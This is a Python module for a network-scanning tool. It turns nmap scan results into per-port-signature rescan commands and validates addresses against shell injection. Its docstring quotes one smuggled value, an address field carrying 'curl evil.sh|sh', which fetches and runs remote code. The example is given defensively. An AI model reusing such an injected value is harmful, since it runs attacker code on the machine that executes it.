"""Turn what a scan found into the nmap command that scans only *that*.

A finished scan already knows which hosts are up and which ports they have
open.  That is exactly the input the next pass needs: instead of sweeping whole
hosts again, aim at the ports that are known to exist.

nmap takes one port list per invocation and applies it to every target, so
"only what exists" cannot be a single command -- ``-p 22,80,443 a b c`` probes
all three ports on all three hosts.  The precision comes from **grouping by
port signature**: hosts whose open ports are exactly the same set share one
command, and a host never receives a port it does not have.

Two rules keep the generated line honest:

* **The group decides the scan types, not the profile.**  From the profile we
  only inherit *which* TCP variant it wanted, so a deliberate ``-sT`` survives;
  a UDP-only group never drags along an orphan ``-sS``.  A mixed group does get
  an explicit TCP type, because ``-sU`` without one makes nmap ignore the
  ``T:`` half of the port spec.
* **Addresses are validated before they reach a command line.**  ``addr`` is
  CDATA in nmap.dtd, so ``addr="10.0.0.1; curl evil.sh|sh"`` is a valid report.
  Here the sink is a shell and the reader's clipboard, so anything that is not
  an IP address is dropped rather than escaped.

This module is pure: no config, no UI, no imports from :mod:`xnp`.  The report
carries a JavaScript port of the same rules (see ``TARGET_SHAPES`` and
``signatureGroups`` in ``xnp/data/report/report.js``) -- **keep the two in sync**.
"""

import ipaddress
import shlex
from dataclasses import dataclass

#: Ports live under one of these; anything else (``-sO`` protocol numbers,
#: sctp) is not a port in the sense ``-p T:/U:`` means.
PROTOCOLS = ("tcp", "udp")

#: Flags that name the ports to scan.  A rescan supplies its own ``-p``, so
#: whatever the profile said about ports is replaced, not merged.
PORT_SPEC_FLAGS = ("-p", "--top-ports", "--exclude-ports", "--exclude-port")

#: TCP scan types, listed one by one on purpose: ``-sV`` and ``-sC`` also start
#: with ``-s`` and are not scan types at all.
TCP_SCAN_TYPES = ("-sS", "-sT", "-sA", "-sW", "-sM", "-sN", "-sF", "-sX")

#: Scans that cannot take a TCP/UDP port list: host discovery only (``-sn``,
#: ``-sL``, ``-sP``), IP protocol scan (``-sO``) and sctp (``-sY``, ``-sZ``).
INCOMPATIBLE_SCANS = ("-sn", "-sL", "-sP", "-sO", "-sY", "-sZ")

#: Flags that make nmap need a raw socket, and so root.
ROOT_FLAGS = frozenset(set(TCP_SCAN_TYPES) - {"-sT"} | {"-sU", "-sO", "-O", "-A"})


@dataclass(frozen=True)
class RescanGroup:
    """Hosts that share one port signature, and so share one command."""

    family: str
    tcp: tuple
    udp: tuple
    hosts: tuple

    @property
    def port_count(self) -> int:
        return len(self.tcp) + len(self.udp)


@dataclass(frozen=True)
class RescanCommand:
    """One generated command, with what had to be dropped to build it."""

    group: RescanGroup
    command: str
    #: Profile flags left out because the rescan decides them itself.
    dropped: tuple = ()


def address_family(address) -> str:
    """``"ipv4"``/``"ipv6"`` for a real address, ``""`` for anything else.

    :mod:`ipaddress` rather than a regex: it is exact about octet ranges and
    about the many shapes of IPv6, and this is the check standing between a
    scanned host's XML and a shell command.
    """
    try:
        parsed = ipaddress.ip_address(str(address))
    except ValueError:
        return ""
    return "ipv6" if parsed.version == 6 else "ipv4"


def _address_key(address):
    """Sort addresses numerically, so 10.0.0.9 comes before 10.0.0.20."""
    return int(ipaddress.ip_address(address))


def group_by_signature(targets, states=("open",)) -> list:
    """Group ``(address, protocol, port, state)`` tuples into rescan groups.

    The signature is ``(family, tcp ports, udp ports)``.  Family is part of it
    because IPv4 and IPv6 targets cannot share an nmap invocation, and IPv6
    needs ``-6``.
    """
    wanted = frozenset(states or ())
    per_host = {}

    for address, protocol, port, state in targets:
        if state not in wanted:
            continue
        protocol = (protocol or "").lower()
        if protocol not in PROTOCOLS:
            continue
        family = address_family(address)
        if not family:
            continue
        try:
            number = int(port)
        except (TypeError, ValueError):
            continue
        if not 0 < number < 65536:
            continue
        per_host.setdefault((family, str(address)), {"tcp": set(), "udp": set()})
        per_host[(family, str(address))][protocol].add(number)

    signatures = {}
    for (family, address), ports in per_host.items():
        signature = (family, tuple(sorted(ports["tcp"])), tuple(sorted(ports["udp"])))
        signatures.setdefault(signature, []).append(address)

    groups = [
        RescanGroup(family=family, tcp=tcp, udp=udp,
                    hosts=tuple(sorted(hosts, key=_address_key)))
        for (family, tcp, udp), hosts in signatures.items()
    ]
    # Biggest first, and fully determined at every level so the output of two
    # runs over the same scan is byte for byte the same.
    groups.sort(key=lambda group: (-len(group.hosts), -group.port_count,
                                   group.family, _address_key(group.hosts[0])))
    return groups


def _port_spec(group: RescanGroup) -> str:
    """The ``-p`` value.  Prefixes are only needed once both halves are there."""
    tcp = ",".join(str(port) for port in group.tcp)
    udp = ",".join(str(port) for port in group.udp)
    if tcp and udp:
        return f"T:{tcp},U:{udp}"
    if udp:
        return f"U:{udp}"
    return tcp


def _split_profile(tokens):
    """Separate what the profile keeps from what the group decides.

    Returns ``(kept, moved, dropped)``.  The distinction matters for what the
    caller reports: ``dropped`` is gone for good, while ``moved`` flags are
    only held back so the group can decide whether to put them in -- warning
    about a ``-sS`` that ends up in the command anyway would be a lie.
    """
    kept, dropped = [], []
    moved = {"tcp_type": "", "udp": False, "six": False}
    skip_value = False

    for token in tokens:
        if skip_value:
            skip_value = False
            dropped.append(token)
            continue

        if token in PORT_SPEC_FLAGS:
            dropped.append(token)
            skip_value = True
        elif token.startswith("-p") and not token.startswith("--") and len(token) > 2:
            # -p-, -p80, -p1-1000: the value is glued to the flag.
            dropped.append(token)
        elif token == "-F":
            dropped.append(token)
        elif token in INCOMPATIBLE_SCANS:
            dropped.append(token)
        elif token == "-6":
            # Re-added from the group's family, so it can never contradict it.
            moved["six"] = True
        elif token in TCP_SCAN_TYPES:
            if not moved["tcp_type"]:
                moved["tcp_type"] = token
        elif token == "-sU":
            moved["udp"] = True
        else:
            kept.append(token)

    return kept, moved, tuple(dropped)


def build_command(group: RescanGroup, args: str = ""):
    """Compose the nmap line for one group.  Returns ``(command, dropped)``.

    The order is fixed -- profile flags, ``-6``, scan types, ``-p``, targets --
    so the same group always produces the same string.
    """
    kept, moved, dropped = _split_profile(shlex.split(args or ""))
    tcp_type = moved["tcp_type"]

    parts = ["nmap"] + kept
    if group.family == "ipv6":
        parts.append("-6")
    if group.tcp and (group.udp or tcp_type):
        # Only when it is needed: on a TCP-only group with no type in the
        # profile, nmap's own choice (-sS as root, -sT otherwise) is better
        # than forcing sudo on the reader.  A mixed group has no such luxury:
        # -sU without a TCP type makes nmap ignore the T: half of the spec.
        parts.append(tcp_type or "-sS")
    if group.udp:
        parts.append("-sU")
    parts += ["-p", _port_spec(group)]

    # A moved flag is only reported as lost when the group had no use for it:
    # a TCP type on a UDP-only group, -sU on a TCP-only one, -6 on IPv4.
    lost = list(dropped)
    if tcp_type and tcp_type not in parts:
        lost.append(tcp_type)
    if moved["udp"] and not group.udp:
        lost.append("-sU")
    if moved["six"] and group.family != "ipv6":
        lost.append("-6")

    # shlex.join quotes only what needs it, so --script "vuln and safe"
    # survives the round trip.  The hosts are appended raw: they went through
    # address_family() and cannot contain anything a shell would read.
    return shlex.join(parts) + " " + " ".join(group.hosts), tuple(lost)


def commands(targets, args: str = "", states=("open",)) -> list:
    """Every rescan command for a set of targets, biggest group first."""
    built = []
    for group in group_by_signature(targets, states):
        command, dropped = build_command(group, args)
        built.append(RescanCommand(group=group, command=command, dropped=dropped))
    return built


def needs_root(command: str) -> bool:
    """Whether the command uses a scan that needs a raw socket."""
    return any(token in ROOT_FLAGS for token in shlex.split(command))
